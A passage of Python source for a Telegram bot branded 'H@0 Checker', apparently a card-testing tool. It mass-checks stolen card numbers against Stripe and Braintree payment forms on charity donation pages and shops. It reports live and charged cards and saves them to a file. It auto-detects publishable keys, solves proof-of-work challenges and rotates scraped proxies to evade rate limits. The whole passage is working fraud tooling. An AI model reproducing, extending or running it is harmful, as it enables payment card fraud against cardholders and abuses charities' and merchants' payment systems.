                            live_message = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, f" [MC]", check_time)

                            keyboard = InlineKeyboardMarkup(inline_keyboard=[
                                [InlineKeyboardButton(text="💎 H@0", url="https://t.me/historyindaysd")]
                            ])

                            if get_notify("live") and active_chat:
                                for send_attempt in range(3):
                                    try:
                                        if os.path.exists(PHOTO_PATH):
                                            await bot_inst.send_photo(
                                                active_chat,
                                                photo=InputFile(PHOTO_PATH),
                                                caption=live_message,
                                                reply_markup=keyboard,
                                                parse_mode='HTML'
                                            )
                                        else:
                                            await bot_inst.send_message(active_chat, live_message, reply_markup=keyboard, parse_mode='HTML')
                                        break
                                    except Exception as e:
                                        err_msg = str(e).lower()
                                        if 'retry after' in err_msg or 'too many requests' in err_msg:
                                            await asyncio.sleep(10)
                                        elif send_attempt == 2:
                                            logger.error(f"MC channel send failed: {e}")
                                        else:
                                            await asyncio.sleep(2)

                            try:
                                chk_msg = fmt_live_msg(card_str, bin_info, gate_name, detail, proxy_display, tag, f" [MC]", check_time)
                                await bot_inst.send_message(chat_id, chk_msg, parse_mode='HTML')
                            except Exception:
                                pass

                            approved_cards.append(card_str)
                            track_user_card(uid, card_str, "live")
                            logger.info(f"[MC-LIVE] {cc[:6]}*** | {gt_label} | {detail[:40]}")
                            break
                        else:
                            logger.info(f"[MC-DEAD] {cc[:6]}*** | {gt_label} | {detail[:40]}")
                            track_user_card(uid, f"{card_str} | {gt_label}: {detail[:60]}", "error")

                    except Exception as e:
                        mc_stats['errors'] += 1
                        SESSION_STATS['total_errors'] += 1
                        track_user_card(uid, f"{card_str} | ERROR: {str(e)[:60]}", "error")
                        logger.error(f"MC check error: {e}")

                mc_stats['checked'] += 1
                SESSION_STATS['total_checked'] += 1
                increment_user_check_count(uid)
                if not card_is_live:
                    mc_stats['dead'] += 1
                    SESSION_STATS['total_dead'] += 1

                if mc_stats['checked'] % 10 == 0:
                    try:
                        progress = (
                            f"📦 <b>MC Progress</b>: "
                            f"<code>{mc_stats['checked']}/{len(cards)}</code> · "
                            f"✅ <code>{mc_stats['live']}</code> · "
                            f"❌ <code>{mc_stats['dead']}</code>"
                        )
                        await bot_inst.send_message(chat_id, progress, parse_mode='HTML')
                    except Exception:
                        pass

                await asyncio.sleep(1)

            if approved_cards:
                try:
                    approved_file = os.path.join(BASE_DIR, "approved.txt")
                    with open(approved_file, 'a') as f:
                        for c in approved_cards:
                            f.write(c + '\n')
                except Exception as e:
                    logger.error(f"MC approved write error: {e}")

            cancelled = _mass_check_cancel.get(uid, False)
            status_word = "CANCELLED" if cancelled else "COMPLETE"
            hit_rate = f"{(mc_stats['live'] / mc_stats['checked'] * 100):.1f}%" if mc_stats['checked'] > 0 else "0%"

            mc_buttons = [
                [InlineKeyboardButton(text="💳 My Lives", callback_data="mycards"),
                 InlineKeyboardButton(text="⚠️ My Errors", callback_data="myerrors")],
                [InlineKeyboardButton(text="🎛 Panel", callback_data="panel"),
                 InlineKeyboardButton(text="📄 All Approved", callback_data="approved")]
            ]

            auth_count = mc_stats.get('auth', 0)
            charged_count = mc_stats['charged']
            await bot_inst.send_message(
                chat_id,
                f"<b>📦  MASS CHECK {status_word}</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<b>📊  RESULTS</b>\n"
                f"💳 Checked: <code>{mc_stats['checked']}/{len(cards)}</code>\n"
                f"✅ Total Live: <code>{mc_stats['live']}</code>\n"
                f"💰 Charged: <code>{charged_count}</code>\n"
                f"🔐 Auth Only: <code>{auth_count}</code>\n"
                f"❌ Dead: <code>{mc_stats['dead']}</code>\n"
                f"⚠️ Errors: <code>{mc_stats['errors']}</code>\n\n"
                f"<b>📈  STATS</b>\n"
                f"📊 Hit Rate: <code>{hit_rate}</code>\n"
                f"💰 Charge Rate: <code>{(charged_count / max(1, mc_stats['live']) * 100):.0f}%</code> of live\n"
                f"🔐 Auth Rate: <code>{(auth_count / max(1, mc_stats['live']) * 100):.0f}%</code> of live\n\n"
                f"<code>━━━ H@0 Checker V6.0 ━━━</code>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(inline_keyboard=mc_buttons)
            )

        except Exception as e:
            logger.error(f"Mass check fatal error: {e}")
            try:
                await bot_inst.send_message(chat_id, f"⚠️ Mass check error: {str(e)[:60]}", parse_mode='HTML')
            except Exception:
                pass
        finally:
            _mass_check_running.pop(uid, None)
            _mass_check_cancel.pop(uid, None)

    @dp.message_handler(content_types=['document'])
    async def handle_document(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            return

        doc = message.document
        if not doc or not doc.file_name:
            return

        if doc.file_name.endswith('.py'):
            raw_name = doc.file_name
            if raw_name.startswith("H0_"):
                raw_name = raw_name[3:]

            if raw_name not in _UPLOADABLE_SCRIPTS:
                await message.reply(
                    f"❌ Unknown script: <code>{doc.file_name}</code>\n\n"
                    "<b>Accepted scripts:</b>\n"
                    + "\n".join(f"  <code>{fn}</code>" for fn in _UPLOADABLE_SCRIPTS.keys())
                    + "\n\n<code>━━ H@0 ━━</code>",
                    parse_mode='HTML'
                )
                return

            try:
                file_info = await message.bot.get_file(doc.file_id)
                file_data = await message.bot.download_file(file_info.file_path)
                script_content = file_data.read().decode('utf-8', errors='ignore')

                if len(script_content.strip()) < 50:
                    await message.reply("❌ Script file is too small / empty.", parse_mode='HTML')
                    return

                try:
                    compile(script_content, raw_name, 'exec')
                except SyntaxError as se:
                    await message.reply(
                        f"❌ <b>Syntax Error in script</b>\n\n"
                        f"File: <code>{raw_name}</code>\n"
                        f"Line {se.lineno}: <code>{str(se.msg)[:80]}</code>\n\n"
                        f"Fix the error and re-send.",
                        parse_mode='HTML'
                    )
                    return

                target_path = os.path.join(BASE_DIR, raw_name)
                backup_path = target_path + ".bak"

                if os.path.exists(target_path):
                    import shutil
                    shutil.copy2(target_path, backup_path)

                with open(target_path, 'w') as f:
                    f.write(script_content)

                line_count = script_content.count('\n') + 1
                size_kb = f"{len(script_content) / 1024:.1f}KB"
                script_type = _UPLOADABLE_SCRIPTS[raw_name]

                module_name = raw_name.replace('.py', '')
                reloaded = False
                try:
                    import importlib
                    if module_name in sys.modules:
                        importlib.reload(sys.modules[module_name])
                        reloaded = True
                except Exception as re_err:
                    logger.warning(f"Module reload failed for {module_name}: {re_err}")

                reload_note = "🔄 Module hot-reloaded" if reloaded else "⚠️ Restart needed to apply"

                await message.reply(
                    f"<b>✅  SCRIPT APPLIED</b>\n"
                    f"━━━━━━━━━━━━━━━━━━━━\n\n"
                    f"📄 File: <code>{raw_name}</code>\n"
                    f"📏 Size: <code>{size_kb}</code>\n"
                    f"📝 Lines: <code>{line_count}</code>\n"
                    f"🏷 Type: <code>{script_type}</code>\n\n"
                    f"{reload_note}\n"
                    f"💾 Backup saved as <code>{raw_name}.bak</code>\n\n"
                    f"<code>━━ H@0 ━━</code>",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                        [InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
                    ])
                )
                logger.info(f"Script {raw_name} uploaded by {message.from_user.id} ({size_kb}, {line_count} lines, reload={reloaded})")
            except Exception as e:
                logger.error(f"Script upload error: {e}")
                await message.reply(f"❌ Upload failed: {str(e)[:60]}", parse_mode='HTML')
            return

        if doc.file_name.endswith('.json'):
            try:
                file_info = await message.bot.get_file(doc.file_id)
                file_data = await message.bot.download_file(file_info.file_path)
                text_content = file_data.read().decode('utf-8', errors='ignore')
                data = json.loads(text_content)

                if data.get("h0_config"):
                    ok, result_msg = import_config_data(data)
                    if ok:
                        gt = data.get("gate_type", "stripe").upper()
                        name = data.get("name", "Unknown")
                        settings_preview = ""
                        for k, v in data.get("settings", {}).items():
                            settings_preview += f"  <code>{k}</code>: <code>{v}</code>\n"

                        await message.reply(
                            f"<b>✅  CONFIG AUTO-IMPORTED</b>\n"
                            f"━━━━━━━━━━━━━━━━━━━━\n\n"
                            f"📋 {result_msg}\n"
                            f"⚙️ Gate: <code>{gt}</code>\n"
                            f"📛 Name: <b>{name}</b>\n\n"
                            f"<b>Settings Applied:</b>\n{settings_preview}\n"
                            f"To overwrite existing config, reply to\n"
                            f"the file with <code>/importcfg [id]</code>\n\n"
                            f"<code>━━ H@0 ━━</code>",
                            parse_mode='HTML',
                            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                                [InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
                            ])
                        )
                        logger.info(f"Config auto-imported by {message.from_user.id}: {result_msg}")
                    else:
                        await message.reply(f"❌ Import failed: {result_msg}", parse_mode='HTML')
                else:
                    await message.reply("❌ Not a valid H@0 config file.", parse_mode='HTML')
            except json.JSONDecodeError:
                await message.reply("❌ Invalid JSON file.", parse_mode='HTML')
            except Exception as e:
                logger.error(f"Config import handler error: {e}")
                await message.reply(f"❌ Import error: {str(e)[:60]}", parse_mode='HTML')
            return

        if doc.file_name.endswith('.txt'):
            try:
                file_info = await message.bot.get_file(doc.file_id)
                file_data = await message.bot.download_file(file_info.file_path)
                text_content = file_data.read().decode('utf-8', errors='ignore')
                lines = [l.strip() for l in text_content.strip().split('\n') if l.strip()]
                card_lines = []
                for line in lines:
                    line = line.replace(' ', '')
                    if '|' in line:
                        pts = line.split('|')
                        if len(pts) >= 4 and pts[0].isdigit() and len(pts[0]) >= 13:
                            card_lines.append(line)

                if card_lines:
                    mc_file = os.path.join(BASE_DIR, "mc_upload.txt")
                    with open(mc_file, 'w') as f:
                        for c in card_lines:
                            f.write(c + '\n')

                    valid = 0
                    for c in card_lines:
                        ok, _ = full_card_check(c)
                        if ok:
                            valid += 1

                    await message.reply(
                        f"<b>📂  FILE RECEIVED</b>\n"
                        f"━━━━━━━━━━━━━━━━━━━━\n\n"
                        f"📄 <code>{doc.file_name}</code>\n"
                        f"💳 Cards found: <code>{len(card_lines)}</code>\n"
                        f"✅ Valid: <code>{valid}</code>\n\n"
                        f"Reply to this file with:\n"
                        f"<code>/masscheck stripe 50</code>\n"
                        f"<code>/masscheck bt 100</code>\n"
                        f"<code>/masscheck both</code>\n\n"
                        f"<code>━━ H@0 ━━</code>",
                        parse_mode='HTML',
                        reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                            [InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
                        ])
                    )
                else:
                    await message.reply(
                        "❌ No valid cards found in file.\n"
                        "Format: <code>CC|MM|YY|CVV</code> per line.",
                        parse_mode='HTML'
                    )
            except Exception as e:
                logger.error(f"Document handler error: {e}")
                await message.reply(f"❌ Error reading file: {str(e)[:60]}", parse_mode='HTML')

    @dp.message_handler(commands=['autofix'])
    async def cmd_autofix(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        await message.reply(
            "<b>🔧  RUNNING DIAGNOSTIC...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            "Checking gate connectivity,\n"
            "form detection, Stripe key,\n"
            "and auto-fixing issues...\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

        try:
            loop = asyncio.get_event_loop()
            diag = await loop.run_in_executor(None, diagnose_gate)

            checks = []
            checks.append(f"  {'✅' if diag['site_reachable'] else '❌'}  Site reachable")
            checks.append(f"  {'✅' if diag['donate_page_ok'] else '❌'}  Donate page OK")
            if diag['pow_required']:
                checks.append(f"  {'✅' if diag['pow_solved'] else '⚠️'}  PoW challenge {'solved' if diag['pow_solved'] else 'FAILED'}")
            checks.append(f"  {'✅' if diag['form_found'] else '❌'}  Charitable form found")
            checks.append(f"  {'✅' if diag['nonce_found'] else '❌'}  Nonce detected")
            checks.append(f"  {'✅' if diag['stripe_key_found'] else '❌'}  Stripe key found")

            all_ok = diag['site_reachable'] and diag['donate_page_ok'] and diag['form_found'] and diag['stripe_key_found']
            overall = "🟢  ALL CHECKS PASSED" if all_ok else "🔴  ISSUES DETECTED"

            checks_str = "\n".join(checks)

            fixes_str = ""
            if diag['fixes_applied']:
                fix_lines = "\n".join(f"  🔧  {f}" for f in diag['fixes_applied'])
                fixes_str = f"\n<b>AUTO-FIXES</b>\n{fix_lines}\n"

            errors_str = ""
            if diag['errors']:
                err_lines = "\n".join(f"  ⚠️  {e}" for e in diag['errors'])
                errors_str = f"\n<b>ERRORS</b>\n{err_lines}\n"

            key_display = diag['stripe_key'] if diag['stripe_key'] else "Not found"

            await message.reply(
                f"<b>🔧  GATE DIAGNOSTIC</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{overall}\n\n"
                f"\n<b>CHECKS</b>\n"
                f"{checks_str}\n\n"
                f"\n<b>DETAILS</b>\n"
                f"🌐  <code>{diag['site_url']}</code>\n"
                f"📄  <code>{diag['donate_path']}</code>\n"
                f"🔑  <code>{key_display}</code>\n"
                f"{fixes_str}{errors_str}\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

            if all_ok and not is_gate_enabled("stripe"):
                set_gate_enabled("stripe", True)
                await message.reply(
                    "🟢 Gate auto-enabled (all checks passed)",
                    parse_mode='HTML'
                )

        except Exception as e:
            logger.error(f"Autofix error: {e}")
            await message.reply(
                f"<b>❌  DIAGNOSTIC FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{str(e)[:60]}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['setupgate'])
    async def cmd_setupgate(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            await message.reply(
                "<b>⚡  QUICK GATE SETUP</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "📌  Just provide <b>site URL</b>\n"
                "Everything else is auto-detected!\n\n"
                "<b>🤖  AUTO-DETECTED</b>\n"
                "🔍  Gate type (Stripe/Braintree)\n"
                "🔑  Pub Key / Token\n"
                "🏷  Account / Payment ID\n"
                "📋  Campaign / Checkout paths\n"
                "📄  Donate path / Cart path\n"
                "🛡  PoW challenge → auto-solve\n\n"
                "<b>📝  USAGE</b>\n"
                "<code>/setupgate https://charity.org</code>\n"
                "<code>/setupgate https://shop.com</code>\n"
                "<code>/setupgate example.org/donate/</code>\n\n"
                "<i>Optionally add PK:</i>\n"
                "<code>/setupgate https://site.com pk_live_xxx</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        parts_args = args.strip().split(None, 1)
        url_arg = parts_args[0]
        manual_pk = parts_args[1].strip() if len(parts_args) > 1 else ""

        await message.reply(
            "<b>🔄  SETTING UP GATE...</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🌐  <code>{url_arg[:50]}</code>\n"
            "🔍  Detecting gate type...\n"
            "⏳  Auto-detecting all settings...\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

        loop = asyncio.get_event_loop()
        try:
            gate_info = await loop.run_in_executor(None, detect_gate_type, url_arg)
            detected_type = gate_info.get("gate_type", "stripe")
            confidence = gate_info.get("confidence", "low")
            signals = gate_info.get("signals", [])

            if detected_type == "braintree":
                result = await loop.run_in_executor(None, setup_braintree_from_url, url_arg)
                gate_label = "BRAINTREE"
            else:
                result = await loop.run_in_executor(None, setup_gate_from_url, url_arg)
                gate_label = "STRIPE"

            if manual_pk and detected_type == "stripe" and result.get("success"):
                set_gate_setting("stripe", "pub_key", manual_pk)
                result["auto_detected"].append(f"Manual PK: {manual_pk[:20]}...")

            detected_lines = f"  🔍  Gate: <b>{gate_label}</b> ({confidence} confidence)\n"
            if signals:
                detected_lines += f"  📡  Signals: <code>{', '.join(signals[:4])}</code>\n"
            for item in result.get("auto_detected", []):
                detected_lines += f"  ✅  <code>{item}</code>\n"

            error_lines = ""
            for err in result.get("errors", []):
                error_lines += f"  ⚠️  <code>{err[:60]}</code>\n"

            setup_buttons = [
                [InlineKeyboardButton(text="🛡 View Gate", callback_data="gate"),
                 InlineKeyboardButton(text="🎛 Panel", callback_data="panel")],
                [InlineKeyboardButton(text="⚙️ Configs", callback_data="configs"),
                 InlineKeyboardButton(text="📊 Stats", callback_data="stats")],
            ]

            if result["success"]:
                set_gate_enabled(detected_type, True)
                active_cid = get_active_config_id()
                set_config_gate_type(active_cid, detected_type)
                await message.reply(
                    f"<b>✅  {gate_label} GATE READY!</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    "<b>🤖  AUTO DETECTED</b>\n"
                    f"{detected_lines}\n"
                    + (f"\n<b>⚠️  WARNINGS</b>\n{error_lines}\n" if error_lines else "")
                    + f"  🟢  {gate_label} gate enabled & ready!\n\n"
                    "<b>💡  NEXT STEPS</b>\n"
                    "  • Use <code>/chk CC|MM|YY|CVV</code> to test\n"
                    "  • Use <code>/setgate</code> to tweak settings\n"
                    "  • Use <code>/gate</code> to view full config\n\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=setup_buttons)
                )
            else:
                await message.reply(
                    "<b>❌  SETUP INCOMPLETE</b>\n"
                    "━━━━━━━━━━━━━━━━━━━━\n\n"
                    + (f"<b>DETECTED</b>\n{detected_lines}\n" if detected_lines else "")
                    + f"\n<b>ERRORS</b>\n{error_lines}\n"
                    "<b>💡  FIX IT</b>\n"
                    "  • Use <code>/setgate</code> to set missing values\n"
                    "  • Use <code>/setupgate [url]</code> with another URL\n\n"
                    "<code>━━ H@0 ━━</code>",
                    parse_mode='HTML',
                    reply_markup=InlineKeyboardMarkup(inline_keyboard=setup_buttons)
                )

        except Exception as e:
            logger.error(f"Setup gate error: {e}")
            await message.reply(
                f"<b>❌  SETUP FAILED</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{str(e)[:60]}</code>\n\n"
                f"<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    def _panel_gate_details(settings, gate_type):
        return _fmt_gate_settings(settings, gate_type, compact=True)

    @dp.message_handler(commands=['panel'])
    async def cmd_panel(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        active_cfg = get_config(get_active_config_id()) or {}
        active_gt = active_cfg.get("gate_type", "stripe")
        gate_on = active_cfg.get("enabled", False)
        gate_icon = "🟢" if gate_on else "🔴"
        gate_label = "ON" if gate_on else "OFF"
        gate_type_label = active_gt.upper()
        bot_icon = "🟢" if bot_running else "🔴"
        bot_label = "RUNNING" if bot_running else "STOPPED"

        settings = active_cfg.get("settings", {})
        site = settings.get('site_url', 'Not set')

        ns = get_all_notify()
        n_live = "🟢" if ns['live'] else "🔴"
        n_dec = "🟢" if ns['decline'] else "🔴"
        n_err = "🟢" if ns['errors'] else "🔴"

        uptime = format_uptime(SESSION_STATS['start_time'])
        checked = SESSION_STATS['total_checked']
        live = SESSION_STATS['total_live']
        charged = SESSION_STATS['charged']
        dead = SESSION_STATS['total_dead']
        errors = SESSION_STATS['total_errors']
        hit_rate = f"{(live / checked * 100):.1f}%" if checked > 0 else "0%"

        rl = get_rate_limiter()
        rl_stats = rl.get_stats()
        api_ok = "🟢" if not rl_stats.get('is_banned') else "🔴"
        rpm = rl_stats.get('requests_in_window', 0)

        pool = get_pool_size()

        custom_ch = get_custom_chat_id()
        ch_label = f"Custom: {custom_ch}" if custom_ch else "Default (env)"

        await message.reply(
            "🎛 <b>H@0 ADMIN PANEL</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{bot_icon} Bot: <b>{bot_label}</b> · {gate_icon} {gate_type_label} {gate_label}\n"
            f"{api_ok} API <code>{rpm}/20</code> RPM · ⏱ <code>{uptime}</code>\n\n"
            f"📋 Checked <code>{checked}</code> · Hit <code>{hit_rate}</code>\n"
            f"✅ <code>{live}</code> · 💰 <code>{charged}</code> · ❌ <code>{dead}</code> · ⚠️ <code>{errors}</code>\n"
            f"🌐 <code>{pool}</code> proxies · 🎯 <code>{len(crawler_instance.bins) if crawler_instance and hasattr(crawler_instance, 'bins') else 0}</code> BINs\n\n"
            f"🛡 <b>Config #{get_active_config_id()}</b> · <code>{active_cfg.get('name', 'default')}</code>\n"
            f"🌐 <code>{site[:35]}</code>\n"
            f"{_panel_gate_details(settings, active_gt)}\n"
            f"{'🟢' if is_proxy_enabled() else '🔴'} Proxy <b>{'ON' if is_proxy_enabled() else 'OFF'}</b> · <code>{'Custom' if has_custom_proxies() else 'Auto'}</code> · <code>{MAX_WORKERS}w</code>\n"
            f"🔔 {n_live} Live {n_dec} Decline {n_err} Errors\n"
            f"📡 Channel: <code>{ch_label}</code>\n\n"
            f"⚙️ <code>{config_count()}/5</code> configs · Active <b>#{get_active_config_id()}</b> · Parallel {'🟢' if is_parallel_enabled() else '🔴'}\n"
            f"👑 <code>{1 + len(get_all_admins())}</code> admins · 🔑 <code>{len(get_all_redeem_keys())}</code> keys\n\n"
            f"<code>━━ H@0 ━━</code>",
            parse_mode='HTML',
            reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="📊 Stats", callback_data="stats"),
                 InlineKeyboardButton(text="🛡 Gate", callback_data="gate")],
                [InlineKeyboardButton(text="▶️ Start", callback_data="start_bot"),
                 InlineKeyboardButton(text="⏹ Stop", callback_data="stop_bot")],
                [InlineKeyboardButton(text="📦 Mass Check", callback_data="masscheck"),
                 InlineKeyboardButton(text="⚙️ Configs", callback_data="configs")],
                [InlineKeyboardButton(text="🌐 Proxy", callback_data="proxy"),
                 InlineKeyboardButton(text="📄 Report", callback_data="approved")],
                [InlineKeyboardButton(text="📖 Help", callback_data="help")]
            ])
        )

    @dp.message_handler(commands=['proxy'])
    async def cmd_proxy(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            enabled = is_proxy_enabled()
            icon = "🟢" if enabled else "🔴"
            label = "ON" if enabled else "OFF"
            custom = get_custom_proxies()
            pool = get_pool_size()
            source = "Custom" if custom else "Auto-scrubbed"
            scrub = get_scrub_stats()
            last_scrub_time = time.strftime('%I:%M %p', time.localtime(scrub['last_scrub'])) if scrub['last_scrub'] > 0 else "Never"
            avg_lat = scrub.get('avg_latency', 0)
            cycles = scrub.get('scrub_cycles', 0)
            scraped = scrub.get('total_scraped', 0)
            s_ok = scrub.get('sources_ok', 0)
            s_fail = scrub.get('sources_fail', 0)

            await message.reply(
                f"🌐 <b>PROXY STATUS</b>\n"
                f"━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{icon}  Proxy: <b>{label}</b>\n"
                f"📡  Source: <code>{source}</code>\n"
                f"📊  Live Pool: <code>{pool}</code> / Target <code>{TARGET_LIVE}</code>\n"
                f"🔄  Workers: <code>{MAX_WORKERS}</code> concurrent\n\n"
                f"<b>SCRUB STATS</b>\n"
                f"📥  Scraped: <code>{scraped}</code> raw\n"
                f"🌐  Sources: <code>{s_ok}</code> OK · <code>{s_fail}</code> failed\n"
                f"⚡  Avg Latency: <code>{avg_lat}ms</code>\n"
                f"🔄  Cycles: <code>{cycles}</code>\n"
                f"⏱  Last: <code>{last_scrub_time}</code>\n\n"
                f"<b>COMMANDS</b>\n"
                f"<code>/proxy on</code> · <code>/proxy off</code>\n"
                f"<code>/addproxy ip:port</code>\n"
                f"<code>/proxies</code> · <code>/clearproxies</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML',
                reply_markup=InlineKeyboardMarkup(inline_keyboard=[
                    [InlineKeyboardButton(text="🟢 Proxy ON" if not enabled else "🔴 Proxy OFF",
                                          callback_data="proxy_on" if not enabled else "proxy_off"),
                     InlineKeyboardButton(text="🔄 Scrub Now", callback_data="scrub_now")],
                    [InlineKeyboardButton(text="🎛 Panel", callback_data="panel")]
                ])
            )
            return

        toggle = args.strip().lower()
        if toggle == 'on':
            set_proxy_enabled(True)
            await message.reply(
                "<b>✅  PROXY ENABLED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"🟢  Proxies are <b>ON</b>\n"
                f"📊  Pool: <code>{get_pool_size()}</code> / <code>{TARGET_LIVE}</code>\n"
                f"🔄  Workers: <code>{MAX_WORKERS}</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        elif toggle == 'off':
            set_proxy_enabled(False)
            await message.reply(
                "<b>✅  PROXY DISABLED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "🔴  Proxies are <b>OFF</b>\n"
                "All requests go <b>DIRECT</b>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(
                "<b>❌  INVALID OPTION</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "Use <code>/proxy on</code> or <code>/proxy off</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['addproxy'])
    async def cmd_addproxy(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            await message.reply(
                "<b>🌐  ADD PROXY</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>Usage:</b>\n"
                "<code>/addproxy ip:port</code>\n"
                "<code>/addproxy ip:port:user:pass</code>\n\n"
                "Multiple proxies (one per line):\n"
                "<code>/addproxy\n"
                "1.2.3.4:8080\n"
                "5.6.7.8:3128</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        lines = args.strip().split('\n')
        added = 0
        dupes = 0
        for line in lines:
            proxy = line.strip()
            if not proxy:
                continue
            if add_custom_proxy(proxy):
                added += 1
            else:
                dupes += 1

        total = len(get_custom_proxies())
        await message.reply(
            "<b>✅  PROXIES ADDED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"➕  Added: <code>{added}</code>\n"
            f"🔁  Duplicates: <code>{dupes}</code>\n"
            f"📊  Custom pool: <code>{total}</code>\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['removeproxy'])
    async def cmd_removeproxy(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            await message.reply(
                "<b>🌐  REMOVE PROXY</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                "<b>Usage:</b>\n"
                "<code>/removeproxy ip:port</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        proxy = args.strip()
        if remove_custom_proxy(proxy):
            total = len(get_custom_proxies())
            await message.reply(
                "<b>✅  PROXY REMOVED</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"➖  <code>{proxy}</code>\n"
                f"📊  Custom pool: <code>{total}</code>\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
        else:
            await message.reply(
                "<b>❌  NOT FOUND</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"<code>{proxy}</code> not in custom pool\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )

    @dp.message_handler(commands=['proxies'])
    async def cmd_proxies(message: Message):
        if not is_authorized(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        custom = get_custom_proxies()
        enabled = is_proxy_enabled()
        p_icon = "🟢" if enabled else "🔴"
        p_label = "ON" if enabled else "OFF"

        if not custom:
            pool = get_pool_size()
            await message.reply(
                "<b>🌐  PROXY LIST</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
                f"{p_icon}  Proxy: <b>{p_label}</b>\n"
                f"📡  Source: <code>Auto-scrubbed</code>\n"
                f"📊  Pool: <code>{pool}</code> proxies\n\n"
                "No custom proxies set.\n"
                "Use <code>/addproxy ip:port</code> to add.\n\n"
                "<code>━━ H@0 ━━</code>",
                parse_mode='HTML'
            )
            return

        proxy_list = "\n".join([f"  <code>{p}</code>" for p in custom[:30]])
        extra = f"\n  ... and {len(custom) - 30} more" if len(custom) > 30 else ""

        await message.reply(
            "<b>🌐  CUSTOM PROXIES</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"{p_icon}  Proxy: <b>{p_label}</b>\n"
            f"📊  Total: <code>{len(custom)}</code>\n\n"
            f"{proxy_list}{extra}\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['clearproxies'])
    async def cmd_clearproxies(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        count = len(get_custom_proxies())
        clear_custom_proxies()
        await message.reply(
            "<b>✅  PROXIES CLEARED</b>\n"
            "━━━━━━━━━━━━━━━━━━━━\n\n"
            f"🗑  Removed <code>{count}</code> custom proxies\n"
            f"📡  Reverted to auto-scrubbed pool\n"
            f"📊  Pool: <code>{get_pool_size()}</code> proxies\n\n"
            "<code>━━ H@0 ━━</code>",
            parse_mode='HTML'
        )

    @dp.message_handler(commands=['setchannel'])
    async def cmd_setchannel(message: Message):
        if not is_admin(message.from_user.id, message.from_user.username):
            await message.reply("🔒 Access denied.", parse_mode='HTML')
            return

        args = message.get_args()
        if not args:
            current = get_custom_chat_id()
            env_id = TELEGRAM_CHAT_ID
            display_id = current if current else env_id
            await message.reply(
                "<b>📡  CHANNEL INFO</b>\n"
                "━━━━━━━━━━━━━━━━━━━━\n\n"
